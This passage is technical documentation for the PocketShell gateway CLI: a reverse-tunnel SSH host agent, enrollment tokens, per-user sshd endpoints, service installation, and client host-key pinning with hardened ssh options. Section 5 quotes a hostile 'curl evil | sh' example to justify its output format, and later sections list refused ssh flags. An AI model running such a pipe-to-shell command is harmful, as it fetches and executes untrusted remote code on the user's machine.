# Gateway: `pocketshell gateway`

`pocketshell gateway enroll|run|show` are the host-side entry points for the
PocketShell **gateway transport**: the reverse-tunnel host agent for machines
that have no inbound SSH (a phone cannot dial into a laptop behind NAT). The
host holds one outbound WSS connection to the SSH gateway; the gateway opens
multiplexed streams over it, each bridged to the host's own sshd listening on
loopback. No inbound ports are opened anywhere. The client side —
`pocketshell gateway devices|pin|ssh` on your laptop, reaching such a host
with plain OpenSSH — is §9.

The host-side Python commands are deliberately thin: they resolve the installed Go
helper **`pocketshell-link`** and replace their own process with it
(`os.execv`). No tunnel, enrollment, or SSH logic lives in Python. That is a
feature, not a shortcut:

- **stdin** is inherited untouched — the enroll token you pipe in flows
  straight to the helper. `pocketshell` never reads it, so it can never log
  it, and there is deliberately no `--token` CLI flag (a token in argv leaks
  via shell history and process listings).
- **signals** behave as if you had run `pocketshell-link` yourself — Ctrl+C /
  SIGTERM reach the helper's own handlers directly.
- **exit codes** are the helper's, verbatim (enroll/show failure → 1, bad
  usage → 2, clean stop → 0).
- **flags** are forwarded as exact argv elements. Values with spaces (host-key
  lines, paths) stay single elements; nothing is ever interpolated through a
  shell.

Server and identity options use the helper defaults. Enrollment initializes
the private endpoint and forwards its argv:

| Option | Forwarded only when passed | Helper default |
| --- | --- | --- |
| `--server` | yes | `wss://gateway.pocketshell.io` |
| `--config-dir` | yes | `${XDG_CONFIG_HOME:-$HOME/.config}/pocketshell-link` |
| `--ssh-host` | yes (`enroll`) | private exec endpoint; port 22 refused |
| `--device-id` | yes (`enroll`) | auto-generated from the hostname |
| `--expect-host-key` | yes (`enroll`) | private host public key pinned locally |
| `--re-enroll` | yes (`enroll`) | off — re-enrollment is refused without it |
| `--dev-broker-issuer` | yes (`enroll`, dev-guarded) | production broker issuer |
| `--insecure-dev` | yes, never defaulted | off |

## 1. Install the helper

`pocketshell` does **not** bundle or download `pocketshell-link` (and accepts
no credentials for fetching it). Two supported routes, both ending in a
binary the wrapper protocol-verifies before every use (§1.1):

**Private beta — install the platform wheel (recommended).** The private
repo's CI packages the helper as `pocketshell-gateway-link` wheels for
linux amd64/arm64 and darwin amd64/arm64. Retrieve the wheel for your
platform from the **authenticated private CI** (you need repo access),
**verify it against the independently published sha256 digest and build
provenance** — no matching digest, no install — then install offline:

```bash
sha256sum pocketshell_gateway_link-*.whl   # compare with the published digest
pip install --no-index --no-deps /verified/path/pocketshell_gateway_link-<version>-<platform>.whl
```

`--no-index --no-deps` keeps the install fully offline; the wheel is
dependency-free. There is no public package yet, so there is deliberately
no `pocketshell` extra to depend on one.

**Build from source.** From a checkout of the private
[pocketshell-gateway](https://github.com/PocketShell-io/pocketshell-gateway)
repository (you need access and a Go toolchain):

```bash
cd /path/to/pocketshell-gateway
go build -o "$HOME/.local/bin/pocketshell-link" ./cmd/pocketshell-link
```

An un-injected source build honestly reports itself as `devel`/`unknown`
build metadata — protocol-compatible and fine for local testing, but never
mistaken for a release (release artifacts carry injected version/commit
values).

### 1.1 Resolution order and failure modes

1. `POCKETSHELL_GATEWAY_HELPER` — an explicit pin to a trusted binary. A pin
   that is missing or not executable is a hard error; the wrapper never
   silently falls back to a different binary off PATH.
2. the binary inside an installed `pocketshell-gateway-link` wheel. An
   installed-but-broken wheel — binary missing or not executable, wheel
   built for another platform (Windows has no wheel at all) — is a hard
   error, never a silent fallback.
3. `pocketshell-link` on `PATH`.

With none of the three, every `gateway` subcommand exits **127** and prints
both routes (wheel install, or the build instructions above). A found
helper must additionally answer the `version --json` metadata probe with
the exact protocol tag `pocketshell-tunnel-v1` before anything runs — a
stale, alien, or misbehaving helper is refused with exit **126** and a
one-line compatibility error (no helper output is echoed, nothing is
downloaded). See
[docs/gateway-distribution.md](gateway-distribution.md) for the full
distribution contract, the checksum verification steps, and the gate's
bounds. (The helper's other subcommands, e.g. `pocketshell-link version`,
are reachable by calling the helper directly; this CLI wraps exactly
`enroll`, `run`, and `show`.)

## 2. Private per-user SSH endpoint

The gateway carries real end-to-end SSH to your private OpenSSH endpoint.
Linux and macOS run one `sshd -i -f <private-config>` process per connection,
as your ordinary account, over stdin/stdout. There is no TCP listener, system
service, administrator installation, or firewall change. An existing system
SSH server can continue using port 22 independently. The agent refuses port 22.

```bash
pocketshell gateway endpoint init
# Enroll also runs endpoint init automatically.
pocketshell gateway enroll
```

Initialization finds `/usr/sbin/sshd` or `/usr/local/sbin/sshd` and uses only the
binary. macOS ships `/usr/sbin/sshd`. If neither exists, setup fails clearly;
bundling portable OpenSSH is a follow-up. It never edits `/etc/ssh/sshd_config`,
starts a system daemon, or runs an administrator package installer.

Endpoint files live under `~/.local/state/pocketshell/endpoint/` on Linux or
`~/Library/Application Support/PocketShell/endpoint/` on macOS. The directory
is mode 0700. `ssh-keygen -t ed25519 -N ''` creates a dedicated host key, and
the private key and config are mode 0600. Repeating init preserves the key
and custom config. An exact earlier generated config is atomically upgraded
to permit local TCP forwarding. Enrollment and show read only its `.pub` for the pin.

The generated config permits only the current user and public-key login:
`PasswordAuthentication no`, `KbdInteractiveAuthentication no`,
`PubkeyAuthentication yes`, `PermitRootLogin no`, `UsePAM no`, `StrictModes yes`,
`PidFile none`, `Subsystem sftp internal-sftp`, and `LogLevel ERROR`. It also
allows local TCP forwarding for browser port forwards (`AllowTcpForwarding local`),
with `GatewayPorts no`, `X11Forwarding no`, `AllowAgentForwarding no`,
`AllowStreamLocalForwarding no`, and `PermitTunnel no`. Authorize your client key in your
`~/.ssh/authorized_keys` or the endpoint's `authorized_keys` (mode 0600).
The gateway never receives client SSH private keys. The separate device
identity key authenticates the tunnel; the SSH host key authenticates your
machine; the client's SSH key grants access to your account.

Verify the private host fingerprint before pairing:

```bash
ssh-keygen -lf ~/.local/state/pocketshell/endpoint/ssh_host_ed25519_key.pub
```

Use the macOS endpoint path above on macOS. Root login is forbidden; run the
host agent as the ordinary account whose shell you want to reach.

Windows retains its owned private loopback endpoint, guardian and ordinary-user
agent runtime (`gateway agent install|start|status`). Its port must be unused and between 1024 and 65535; enrollment
passes `--ssh-host 127.0.0.1:<private-port>`. Use `gateway agent install` on
Windows; Linux/macOS endpoint init does not change that runtime.

### 2.1 Migrate an existing endpoint

```bash
pocketshell gateway endpoint migrate
# Or: ... migrate --config-dir DIR --token-stdin < enrollment-token.txt
```

Migration creates the private endpoint, prints the new public host key for
clients to re-pin, and explicitly re-enrolls the existing device against that
key. The config changes only after the gateway accepts the replacement;
re-enrollment must be enabled by the gateway operator. Clients must explicitly
replace their existing pin using `gateway pin DEVICE_ID --replace` with the
new independently verified key. Restart your own user-level link after the
migration. The command does not stop or restart a running service.

## 3. Enroll the host

One-time per host. Enrollment needs a fresh **gateway enrollment token** —
a short-lived (≤ 5 minutes) token scoped to `pocketshell-gateway`, minted by
the trusted PocketShell token service. Two ways to supply it:

**Logged in on the host (`pocketshell login`)** — just run

```bash
pocketshell gateway enroll
```

The wrapper first resolves and protocol-verifies the helper (§1.1), then
mints the token from your login session and hands it to the helper as its
entire stdin through a private pipe (`os.pipe` → write → close → `dup2`
onto fd 0 → `execv`). The token is never in argv, the environment or a
file, and your terminal's stdin is not inherited. Not logged in → exit
**3** with a hint to run `pocketshell login` or use `--token-stdin`.
Auto-minting only ever sends the token to the production gateway, or to a
non-production `--server` you name exactly with `--trust-gateway HOST`
(same strict URL rules as the client, §9.1); `--dev-broker-issuer` always
needs a lab token on `--token-stdin`.

**Token piped in** — generate it in the PocketShell web client's gateway
settings (**Generate enrollment token**), then:

```bash
pocketshell gateway enroll --token-stdin < enrollment-token.txt
```

**Already enrolled?** Re-enrollment is explicit: the helper refuses to
overwrite an existing registration unless you pass `--re-enroll` (the
gateway may also have re-enrollment disabled entirely — that refusal comes
from the server, not the CLI).

Useful flags:

```bash
pocketshell gateway enroll --token-stdin \
    --device-id office-workstation \
    --expect-host-key "SHA256:AbCd…/Fp=" \
    --re-enroll
```

- With `--token-stdin` the token is read from your stdin. The token
  is short-lived — run enroll right after generating it. It travels only as
  the `Authorization` header of the enroll request, never in a URL, argv, or
  log line, and this wrapper passes stdin through opaquely (it never reads,
  exchanges, or logs the token; there is no token CLI flag — argv leaks via
  shell history and process listings).
- **Never pipe your raw account sign-in credential here.** Only the
  gateway-scoped enrollment token belongs on stdin; the account token itself
  must never reach the gateway.
- `--expect-host-key` pins the sshd host key you expect; a mismatch aborts
  enrollment. Without it, the helper still probes and pins whatever the
  local sshd presents — pass the flag when you can verify the fingerprint.
- Enrollment proves possession of the generated device key via a signed
  challenge; the gateway verifies the enrollment token's broker issuer,
  fixed `pocketshell-gateway` audience, and short expiry.

## 4. Run the agent

```bash
pocketshell gateway run
```

Foreground process; stop with Ctrl+C or SIGTERM (clean exit 0). It reads the
state written by `enroll` from the config dir. `--server` overrides the
enrolled URL; `--verbose` turns on debug logging (to stderr).

### 4.1 Durable start: `pocketshell gateway service`

Linux uses a systemd user unit. On Windows, use the ordinary-user `gateway agent`
runtime described in [Windows private runtime](windows-gateway-private-runtime.md),
which needs no elevation, system service, or firewall rule. The S4U task path below
is the older optional service mode; its elevated registration is not required by
the ordinary-user endpoint.

The supported way to keep an **enrolled** agent running across logouts
and reboots, without a visible window:

```bash
pocketshell gateway service install --dry-run   # print exactly what would be done
pocketshell gateway service install             # write/register it and start it (exit 5: installed, NOT started)
pocketshell gateway service status [--json]     # exit 0 running, 3 installed but stopped, 4 not installed
pocketshell gateway service uninstall           # stop and remove ONLY the unit/task
```

| Option | Meaning |
| --- | --- |
| `--config-dir DIR` | The enrolled state dir, passed to the helper explicitly (default: the helper's default dir). |
| `--helper PATH` | Absolute `pocketshell-link`. Linux default: the normal resolution of §1.1 plus the `version --json` protocol gate. Windows: required (or `POCKETSHELL_GATEWAY_HELPER`). |
| `--dry-run` | Print the unit file / task XML, the commands and the agent's exact argv; write and register nothing. |
| `--force` | Replace an existing unit/task (otherwise refused). |
| `--no-start` | Do not start it now. Linux: `enable` only (starts at the next boot/login). Windows: the task is registered **disabled** (the 5-minute watchdog would otherwise start it); `install --force` later enables and starts it. |

What every platform shares:

- **Requires an existing enrollment.** `install` checks that the config dir
  holds `config.json` and the device key (existence only) and that the
  helper's own `show --config-dir DIR` accepts it; otherwise it refuses
  with "run `pocketshell gateway enroll` first". It never enrolls,
  re-enrolls, reads the key, or writes into the config dir.
- **The helper runs directly**: `<absolute helper> run --config-dir <DIR>`.
  No shell, no `pocketshell` wrapper process, no `--ssh-host` override (the
  enrolled loopback sshd is served).
- **`uninstall` removes only the unit/task** — never the config dir, the
  key, or the device registration (revoke a device separately). Running it
  again is a no-op. A unit/task of the same name that this command did not
  write (no "Managed by" marker) is refused unless `--force`.
- **Exit status** of `install`: 0 installed and started (or registered with
  `--no-start`), **5 installed but NOT started** (the start failed or was not
  confirmed; the unit/task is kept), 1 refused/failed. `status`: 0 running,
  3 installed but not running, 4 not installed, 1 the state could not be read.
- `status` reports presence and state, the configured helper and config
  dir, the helper's sha256, the running process id(s), and the helper's
  non-secret `show` output. All child output is sanitized.

#### Linux: systemd `--user` unit

`install` atomically writes `~/.config/systemd/user/pocketshell-gateway.service`
(`$XDG_CONFIG_HOME` respected; mode 0644, no secrets) and runs
`systemctl --user daemon-reload`, `systemctl --user enable
pocketshell-gateway.service` and then, as a separate step, `start`
(`restart` when `--force` replaced an existing unit). If that start fails the
unit stays written and enabled and `install` exits **5**. The unit:

```ini
# Managed by `pocketshell gateway service install` — ...
[Unit]
Description=PocketShell gateway host agent (pocketshell-link run)
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart="/home/me/.local/bin/pocketshell-link" run --config-dir "/home/me/.config/pocketshell-link"
Restart=on-failure
RestartSec=5

[Install]
WantedBy=default.target
```

Paths are quoted for systemd's own parser (`%` and `$` escaped; `"`, `\`
and control characters refused). A user unit only runs while the user has
a session unless **lingering** is on; `install` warns when it is off:
`sudo loginctl enable-linger $USER`. `uninstall` runs `systemctl --user
disable --now`, deletes the file and reloads; it refuses to delete a
`pocketshell-gateway.service` it did not write (no "Managed by" marker)
unless `--force`. Logs: `journalctl --user -u pocketshell-gateway.service`.

An older hand-written unit (`ExecStart=… pocketshell gateway run` with
`Environment=POCKETSHELL_GATEWAY_HELPER=…`, as earlier versions of this
document showed) keeps working; `install --force` replaces it with the
direct form.

#### Windows: one per-user scheduled task

`install` registers **`\PocketShell\GatewayLink`** with `schtasks /Create /XML`
(every child launched with `CREATE_NO_WINDOW`; no console window, ever).
The definition:

| Field | Value |
| --- | --- |
| Principal | the **current user's SID**, `LogonType` **S4U** (runs whether logged on or not, no stored password), `RunLevel` **LeastPrivilege**. S4U tasks run in the non-interactive **session 0**: nothing can appear on the desktop. |
| Triggers | `BootTrigger` (+30 s) and a `TimeTrigger` repeating every 5 minutes (watchdog). |
| Settings | `MultipleInstancesPolicy=IgnoreNew`, `ExecutionTimeLimit=PT0S` (no 72 h kill), battery stops off, `RunOnlyIfNetworkAvailable=false` (the agent's own backoff handles the network), `RestartOnFailure` 1 min × 999. |
| Action | exactly ONE `Exec`: `Command` = the absolute helper `.exe`, `Arguments` = `run --config-dir "<DIR>"`, `WorkingDirectory` = the helper's directory. **No `cmd.exe`, shell or redirection** (and so no stderr log until the helper grows `run --log-file`). |

Refusals before anything is registered:

- **Helper trust.** The task runs the exe directly, so its sha256 must be on
  the reviewed allow-list in `service_windows.ALLOWED_HELPER_SHA256` —
  today exactly `f9582de6a3f635ec70e4daaf755479788f788d8d493c3ed1fd58812f555dabe1`
  (private qualified build of pocketshell-gateway cd7c6f6). The historical
  8cbeb8f (`57f3a86e…`) and 771c9e1 (`f6e357d8…`) builds are refused by
  name. Adding a build is a reviewed source change, never a flag or env var.
  It must also answer `version --json` with protocol `pocketshell-tunnel-v1`.
- **Same account.** The helper binds the device key's ACL to its owner, so
  the key must be owned by the current user's SID (the config dir by that
  user, or by Administrators/SYSTEM when it was created from an elevated
  prompt). Run `install` as the enrolling user.
- **Paths** must be local absolute drive paths without `"`, `%` (Task
  Scheduler expands `%VAR%`) or control characters; they are stored in their
  long, final form.
- An existing task needs `--force` (which ends the running instance first).

Registering a task with a boot trigger and the S4U logon type normally needs
an **elevated prompt** (*Run as administrator*); the token's user — and
therefore the principal — is still you, and the task still runs with
LeastPrivilege. A refused registration is reported as such; never fall back
to a logon trigger or the Startup folder (they show a console window).

Before the task is ever started, `install` reads the registered definition
back and requires exactly the requested one: one direct Exec with the exact
argv, `WorkingDirectory` = the helper's directory, `UserId` = your SID (an
account-name form only if it resolves to that SID), LogonType S4U and
LeastPrivilege (an export may omit it as the schema default). Anything else
is deleted again and never started. After `/Run`, `install` waits up to
15 s for the task's own state to report Running; otherwise it exits 5.

The task is read through the Task Scheduler COM API (child PowerShell with
`CREATE_NO_WINDOW`). Only "not found" (HRESULT 0x80070002/0x80070003) counts
as absent; access denied or any other query failure is an error — `status`
exits 1 and `uninstall` does not claim success.

`status` reports **running only from the task's own state** (Running). It
also lists the registered principal / logon type / run level, whether the
action is still the direct launch, whether the configured helper is still an
allow-listed build (it runs that helper's `show` only if so), and every
process with the helper's image path and its **session id** — as
diagnostics: a same-path process next to a Ready/Disabled task (e.g. another
supervisor's agent) is reported, but the result is still "not running"
(exit 3). `uninstall` ends and deletes the task, verifies it is gone, then
waits briefly for the helper process to exit.

**Private loopback endpoint (`--with-endpoint MANIFEST`, Windows).** When the
enrolled local sshd is a private endpoint owned by its own guardian,
`install --with-endpoint MANIFEST` also registers `\PocketShell\GatewayEndpoint`.
Its action is exactly `<manifest python> -I -S -B <guardian.py> --manifest
MANIFEST`, as your SID (S4U, LeastPrivilege, session 0, boot +10 s, a
5-minute watchdog), with no shell. The guardian's interface (INTERFACE.md)
is authoritative; see `endpoint-guardian-api-agreement.md`.

- **Manifest.** Version 1 with exactly `ownerSID, root, state, config, port,
  daemon, python, pins, environment, configBindings`, validated with the
  guardian's own rules. The config is checked against the guardian's
  `config_guard`.
- **Before anything runs.** The manifest digest and the
  (guardian.py, native_api.py, policy.py) source triple must be on the
  reviewed lists, which are empty until reviewed. Every pin is re-hashed. The
  service checks the guardian's protected-ancestor and final-file mutation
  authority itself.
- **Readiness.** `CURRENT.json` must point to a `generation-<uuidhex>`
  generation whose READY.json names the held daemon by pid + creation
  FILETIME. The guardian must run the manifest interpreter, the daemon must
  be the only listener, and a real SSH key exchange must prove the enrolled
  pinned host key.
- **Uninstall.** Disables the task, hands the exact held identity to the
  guardian through STOP.json, waits for an accepted CLOSED.json and deletes
  the task. It never kills.
- **Qualification.** `--endpoint-only --instance NAME` registers an isolated
  `GatewayEndpointQ<NAME>` on a non-production port. `--check-only` (Phase A)
  runs the guardian's read-only preflight once in a trigger-less task and
  reports its exit status.

**One agent per device:** a new connection supersedes the old one at the
gateway. Stop any other `pocketshell-link run` for the same enrolled device
before starting the task (`install --no-start` registers it disabled;
`install --force` re-registers it enabled and starts it).

## 5. Show the enrolled state

```bash
pocketshell gateway show
# server:            wss://gateway.pocketshell.io
# device id:         …
# local ssh:         exec [/usr/sbin/sshd -i -f <private-config>]
# device key:        SHA256:…
# pinned ssh host key: …
```

`show` prints no secrets (the device private key stays in its `0600` file in
the config dir).

To let a client pin this host (§9.3), print just the host-key line:

```bash
pocketshell gateway show --host-key
# ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA…          ← stdout: the only thing to copy
# device home-lab, host key SHA256:… (ED25519).  ← stderr: context
# On the client run `pocketshell gateway pin home-lab` and paste the key line above at its prompt.
```

stdout is exactly one `<keytype> <base64>` line, re-validated with the
client's strict pin parser — deliberately **not** a ready-to-run shell
command (a compromised host could otherwise hand you `…; curl evil | sh` to
paste). Compare the fingerprint on both ends.

## 6. Docker / local development gateways

Against a gateway running locally or in Docker (plain `ws://`, no TLS), the
complete flow has **four** explicit pieces — server, dev mode, dev issuer,
token — and the helper checks the token's shape **locally, before any
network request**:

```bash
pocketshell gateway enroll --token-stdin \
    --server ws://gateway:8080 \
    --insecure-dev \
    --dev-broker-issuer "https://lab-broker.example" \
    < lab-token.txt

pocketshell gateway run --server ws://gateway:8080 --insecure-dev
```

- **`--server`** names your lab gateway explicitly. Plain `ws://`/`http://`
  URLs are accepted only together with `--insecure-dev`, on **every**
  command that dials — it is never sticky and never defaulted. TLS
  verification is never skipped either way, and there is no cert-skip flag.
  The URL is forwarded verbatim: IPv6 literals (`ws://[::1]:8080`), paths
  and ports are supported shapes the helper itself validates.
- **`--dev-broker-issuer`** names the issuer your **local lab broker** mints
  its ephemeral enrollment tokens with. The helper's local guard refuses
  every JWT whose `iss` is not exactly this value — including every
  ephemeral lab token when the flag is omitted, and any Google ID token
  always. The refusal happens **before any HTTP request**; that is designed
  behavior, not a bug. The wrapper additionally refuses the flag without
  `--insecure-dev`, without an explicit non-blank `--server` (a blank one
  would let the helper fall back to its built-in production default), for a
  `--server` URL it cannot parse at all (e.g. a malformed IPv6 literal), and
  whenever `--server` names the production gateway — either
  `gateway.pocketshell.io` or its legacy `relay.pocketshell.io` alias,
  compared case-insensitively and ignoring the trailing FQDN dot, so
  `GATEWAY.POCKETSHELL.IO:8080` or `relay.pocketshell.io.` cannot slip
  through. Lab targets (loopback IPv4/IPv6, docker hostnames, paths) are
  forwarded verbatim.
- **The lab token itself** must be a JWT with the broker shape: `aud` exactly
  `pocketshell-gateway`, `scope` exactly `pocketshell.gateway`, lifetime ≤ 5
  minutes, unexpired, RS256-signed. These are shape checks on unverified
  claims (a disclosure gate); the gateway still verifies the signature. Your
  lab's token mint must produce exactly this shape and its gateway side must
  verify the same issuer — the new-API gateway has no accept-any-token mode
  (that flag exists only on the legacy relay binary); point the lab's
  routing-auth verifier at the lab broker's keys, as the Go repo's lab
  fixtures do.
- **Loopback OpenSSH and independent pins hold in the lab too**: the agent
  bridges to the private exec endpoint or an explicit non-22 loopback endpoint,
  and `--insecure-dev` never lifts that. Enrollment reads the private public
  key or probes the explicit lab endpoint independently of the enrollment
  token; the device key, the pinned host key, and the enrollment token
  remain the three separate credentials described in §2. Nothing in this
  section names real secrets — every issuer and URL above is a placeholder.

The production web-client flow from §3 does not apply to a lab: production
tokens carry the production broker issuer and are refused against a lab
`--dev-broker-issuer`, and vice versa.

## 7. Relationship to the legacy `link` transport

This is a different protocol from the older experimental transport, and the
two are **not interoperable**:

| | `pocketshell gateway …` (this doc) | `pocketshell link run` / `pocketshell relay serve` |
| --- | --- | --- |
| Transport | Go `pocketshell-link` helper → SSH gateway | Python daemon → generic relay (`docs/link-transport.md`) |
| Auth | Per-device Ed25519 key enrolled via signed challenge with a gateway-scoped, ≤ 5 min enrollment token | One shared relay token (`--token`) |
| Payload | Real SSH streams to the local sshd | Relay-side exec/PTY protocol |
| State | `${XDG_CONFIG_HOME:-$HOME/.config}/pocketshell-link` | none (flags only) |

Do not point a legacy `pocketshell link run` at the gateway URL: the gateway
speaks the tunnel protocol only and will not serve the legacy shared-token
handshake. Both command groups remain installed side by side, but a host is
enrolled with either one gateway or one legacy relay — never both mixed.

## 8. Status

The host-side commands wrap the Go agent, and the CLI client (§9) reaches
enrolled hosts with OpenSSH. The production gateway (`gateway.pocketshell.io`)
serves enrollment, the host registry (`/api/v1/hosts/*`, so `gateway devices`
and `gateway ssh`) and routes to enrolled hosts.

`gateway enroll` mints its scoped enrollment token from your `pocketshell
login` session. `--token-stdin` remains for tokens obtained elsewhere (for
example lab tooling, §6); the wrapper treats that token as opaque bytes.

How the PocketShell phone/desktop app pairs and connects through this tunnel
is separate work elsewhere. The durable Windows endpoint task
(`service install --with-endpoint`) stays gated on reviewed guardian and
manifest digests (§4.1).

## 9. Client side: reach an enrolled host

On the laptop you connect **from** (needs the `[link]` extra for
`websockets`: `pip install 'pocketshell[link]'`):

```bash
pocketshell login                        # once: device sign-in, stores a CLI session
pocketshell gateway devices              # list your enrolled hosts
pocketshell gateway pin home-lab         # paste the line from `gateway show --host-key` ON THE HOST
pocketshell gateway ssh home-lab -l me   # OpenSSH through the gateway
pocketshell gateway ssh home-lab -l me --key home-lab   # …with a key from the device vault (docs/keys.md)
```

Every command that talks to the gateway mints a fresh short-lived (≤ 5
min) broker JWT from the `pocketshell login` session and sends it only in
the `Authorization` header (`devices`) or the first WebSocket text frame
(`proxy`) — never in a URL, argv, environment variable, file or log line.
Not logged in → exit **3**.

Both token-bearing connections ignore environment proxies (`HTTPS_PROXY`,
`HTTP_PROXY`, `ALL_PROXY`, either case, and `NO_PROXY`) and CA overrides
(`SSL_CERT_FILE`, `SSL_CERT_DIR`): they go direct and verify TLS against the
platform's compiled-in default CA file/directory only. Otherwise the process
environment is trusted — an `.envrc` that can set `PYTHONPATH` or
`LD_PRELOAD` runs code inside the CLI, which no CLI can defend against.

### 9.1 Choosing the gateway

The default is the production gateway `wss://gateway.pocketshell.io`
(its `relay.pocketshell.io` alias is equally production). Any other
`--server`:

- must be a bare origin (`wss://host[:port]`, no path, query, fragment or
  credentials), with a strict host — an IP literal or an IDNA-encoded DNS
  name; whitespace, quotes, `%`, `?`, `#`, backslashes and shell
  metacharacters are refused;
- requires **`--trust-gateway HOST`** naming exactly that host. The client
  sends it a real broker token, which a hostile server could replay
  against the production identity API for up to five minutes;
- plain `ws://`/`http://` additionally requires `--insecure-dev` **and** a
  loopback IP literal or `localhost` (a single-label docker service name
  such as `gateway` is accepted with a cleartext warning). TLS
  certificate verification is never optional, and neither environment
  proxies nor `SSL_CERT_FILE`/`SSL_CERT_DIR` are used (see above).

### 9.2 `gateway devices [--json]`

`GET /identity/v1/devices` with the bearer token (redirects are never
followed — urllib would forward the header). Shows each device id,
active/revoked, the host key fingerprint **as advertised by the gateway
(untrusted)**, and your local pin state (`pinned`, `pinned (DIFFERS from
advertised)`, `not pinned`). All gateway-provided text is sanitized. The
JSON output carries fingerprints only, never the advertised key line, so
`devices --json | … | gateway pin` cannot turn the gateway's claim into
trust.

When the gateway reports presence (the optional per-device `presence`
object of newer gateways), the table gains an **ONLINE** column: `yes`
when the host agent is connected to the gateway right now, `no` when it
is not (enrolled but never connected, disconnected, or revoked — a
revoked device is never shown online), `?` when the gateway did not
report it. A footer gives the gateway's observation time. Against older
gateways the column is omitted and the layout is unchanged. `--json`
always carries `online` (`true`/`false`, or `null` = not reported),
`observed_at`, and — while online — `connected_since` and
`session_generation`. Presence is advisory and parsed leniently: a
malformed `presence` object reads as "not reported", never as an error,
and timestamps that are not plain RFC 3339 are dropped, never printed.

### 9.3 `gateway pin DEVICE_ID` / `gateway unpin DEVICE_ID`

Pinning is the **only** way a host key becomes trusted. Run
`pocketshell gateway show --host-key` on the host (§5), bring that one
line over a channel you trust, and paste it at the `gateway pin` prompt
(or pipe it on stdin; a positional argument is also accepted and
validated identically). The line must be exactly `<keytype> <base64>`
(`ssh-ed25519`, `ecdsa-sha2-nistp256/384/521`, or `ssh-rsa` ≥ 2048 bits):
printable ASCII, one space, canonical base64 decoding to a well-formed key
blob of the stated type with nothing trailing. Comments, options, host
patterns, `@cert-authority`/`@revoked` markers and extra lines are refused.
`pin` prints the `SHA256:` fingerprint — compare it with the host's.

Pins live in `${XDG_CONFIG_HOME:-~/.config}/pocketshell/gateway_known_hosts`
(directory `0700`, file `0600`, written atomically) as known_hosts lines
`pocketshell-gateway.<id lower-cased>-<sha256(id)[:12]> <keytype> <base64> <device-id>`
(the last field is the known_hosts comment, holding the exact id; the name
must be the alias derived from it). OpenSSH matches known_hosts names
case-insensitively, so the hash of the exact id keeps `Home-Lab` and
`home-lab` on different aliases, and pinning an id that differs from an
already pinned one only in letter case is refused. The whole file is
re-validated on every read: a single foreign line (marker, wildcard, hashed
host, a comment other than the line's own id, second key for one device,
two ids differing only in case), group/world-writable permissions or a
foreign owner on the file **or its directory**, or a symlink makes it
untrusted, and `gateway ssh` refuses to
run. Files from earlier versions
(`pocketshell-gateway.<device-id> <keytype> <base64>`) are still read with
the same checks — `gateway ssh` then verifies against that older alias — and
the next `pin`/`unpin` rewrites them in the current format. A different key for an already pinned device
needs `--replace` (re-keyed host — verify on the host first).

### 9.4 `gateway ssh DEVICE_ID [-l USER] [-i KEY | --key NAME] [-- SSH_ARGS…]`

Execs the OpenSSH client (`ssh` resolved once to an absolute path) with an
explicit configuration; refuses to run without a valid pin:

- `-F none` — your `~/.ssh/config` is not read (`Host *` `ForwardAgent`,
  `ProxyJump`, `LocalCommand`, `ControlMaster`… cannot apply);
- host trust: `StrictHostKeyChecking=yes`, `UserKnownHostsFile=<pin file>`,
  `GlobalKnownHostsFile=/dev/null`, `HostKeyAlias=<the pin's alias>`,
  `UpdateHostKeys=no`, `CheckHostIP=no`, `VerifyHostKeyDNS=no`,
  `CanonicalizeHostname=no`;
- nothing of yours is exposed to the host: `ForwardAgent=no`,
  `ForwardX11=no`, `ForwardX11Trusted=no`, `ClearAllForwardings=yes` (only
  dropped when you pass `-L`/`-D`), `Tunnel=no`, `PermitLocalCommand=no`,
  `EnableEscapeCommandline=no` (with `IgnoreUnknown` for OpenSSH < 9.2);
- no session sharing: `ControlMaster=no`, `ControlPath=none`,
  `ControlPersist=no`, `ProxyUseFdpass=no`;
- key authentication only: `PubkeyAuthentication=yes`,
  `PreferredAuthentications=publickey`, `PasswordAuthentication=no`,
  `KbdInteractiveAuthentication=no`, `GSSAPIAuthentication=no`,
  `HostbasedAuthentication=no`, `IdentitiesOnly=yes` (always: `-i KEY`,
  `--key NAME`, or your default `~/.ssh/id_*` files; agent-only keys
  without a file are not offered); `Compression=no`,
  `ExitOnForwardFailure=yes`;
- bounded waits: `ConnectTimeout=30` (connection setup through the
  ProxyCommand, including the SSH banner), `ServerAliveInterval=30`,
  `ServerAliveCountMax=3` (a silent gateway or host ends the session after
  about 90 s);
- `ProxyCommand=<absolute python> -P -m pocketshell gateway proxy <id> […]`:
  the device id is validated against `^[A-Za-z0-9][A-Za-z0-9._:-]{2,63}$`,
  each element is `shlex.quote`d and `%` is doubled for ssh's token
  expansion (no `%h`/`%n` tokens are used), ssh runs it with
  `SHELL=/bin/sh`, and `-P` keeps a `pocketshell/` or `click.py` in your
  current directory from being imported instead of the real package.
  On native Windows, ssh is the inbox Win32-OpenSSH (or
  `POCKETSHELL_SSH`), which starts the ProxyCommand with `CreateProcessW`
  and no shell. The quoting rules and path limits are different there; see
  [windows-gateway-client.md](windows-gateway-client.md).

The hardening `-o` options come first (for ssh, the first value wins), then
your allowlisted arguments, then `--`, the destination alias, and the
remote command. **Extra ssh arguments** (after `--`) are limited to
`-L SPEC`, `-D SPEC`, `-N`, `-T`, `-t`, `-v`/`-vv`/`-vvv`, `-q`, followed by
an optional remote command (passed verbatim; it runs in the remote shell,
as with plain ssh). Everything else is refused — `-o` in any form, `-F`,
`-J`, `-W`, `-A`, `-X`/`-Y`, `-M`/`-S`, `-w`, `-f`, `-p`, `-E`, and `-R`
(remote forwarding would expose a port of your machine to the host).
`-l` names are restricted to `[A-Za-z0-9_][A-Za-z0-9._@-]*`; the pin file
and `-i` paths must be absolute and free of whitespace, `%`, `$`, `~`,
quotes, backslashes and non-ASCII (ssh would expand or split them — set
`XDG_CONFIG_HOME` to a plain path if your home directory has such
characters).

```bash
pocketshell gateway ssh home-lab -l me -i ~/.ssh/id_ed25519
pocketshell gateway ssh home-lab -l me --key home-lab
pocketshell gateway ssh home-lab -l me -- -N -L 8080:localhost:80
pocketshell gateway ssh home-lab -l me -- uptime
```

**`--key NAME`** takes the key from the device-password vault
([keys.md](keys.md)) instead of a file. You type the device password on
the terminal, and the key is decrypted in memory and loaded into a
private `ssh-agent`. That agent's socket sits in a fresh 0700 temporary
directory, and the key is held for at most 120 s. If the key has its own
OpenSSH passphrase, `ssh-add` asks for it on the terminal too. ssh then
runs as a child process (not `exec`) with `IdentityAgent=<that socket>`
and `IdentityFile=<the key's .pub>` inserted right after `-F none`. With
